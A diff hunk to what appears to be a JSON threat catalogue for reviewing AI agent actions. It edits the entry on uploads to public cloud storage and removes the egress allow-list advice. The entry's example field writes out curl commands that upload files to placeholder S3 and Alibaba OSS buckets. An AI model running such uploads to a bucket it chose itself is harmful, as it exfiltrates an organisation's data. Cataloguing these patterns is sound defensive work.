@@ -3387,7 +3387,7 @@
       "threat": "Data uploaded to public cloud storage",
       "example": "The agent uploads data with a raw HTTP client to a public object-storage bucket or a pre-signed URL: `curl -X PUT --data-binary … https://<bucket>.oss-<region>.aliyuncs.com/…`, `curl -T file https://<bucket>.s3.amazonaws.com/…`, an Azure Blob, Google Cloud Storage, Cloudflare R2, Tencent COS or Huawei OBS endpoint, or a URL carrying a signature (X-Amz-Signature, OSSAccessKeyId, an Azure SAS sig=). A download from a bucket is not an upload.",
       "response": "Review where the data is going before it is sent. Anyone holding the bucket or the signed URL reads back what lands there, which makes a bucket the agent picked itself an exfiltration drop; uploading to your own bucket is ordinary work, so this is report-only by default.",
-      "saferAlternative": "Upload with your cloud provider's CLI and the account your organisation configured, and allow-list your own buckets in egress rules.",
+      "saferAlternative": "Upload with your cloud provider's CLI and the account your organisation configured.",
       "severity": 4,
       "likelihood": 2,
       "riskScore": 8,
